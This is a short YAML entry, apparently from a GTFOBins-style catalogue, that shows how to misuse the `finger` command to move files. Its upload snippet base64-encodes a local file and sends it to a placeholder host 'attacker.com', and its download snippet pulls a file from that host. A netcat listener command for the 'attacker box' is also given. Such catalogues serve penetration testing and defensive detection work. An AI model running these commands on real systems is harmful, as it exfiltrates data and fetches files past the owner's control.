---
description: |
  `finger` hangs waiting for the remote peer to close the socket.
functions:
  file-upload:
    - description: Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > "file_to_save"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.
      code: |
        RHOST=attacker.com
        LFILE=file_to_send
        finger "$(base64 $LFILE)@$RHOST"
  file-download:
    - description: Fetch remote binary file from a remote TCP port. Run `base64 "file_to_send" | sudo nc -l -p 79` on the attacker box to send the file.
      code: |
        RHOST=attacker.com
        LFILE=file_to_save
        finger x@$RHOST | base64 -d > "$LFILE"
---
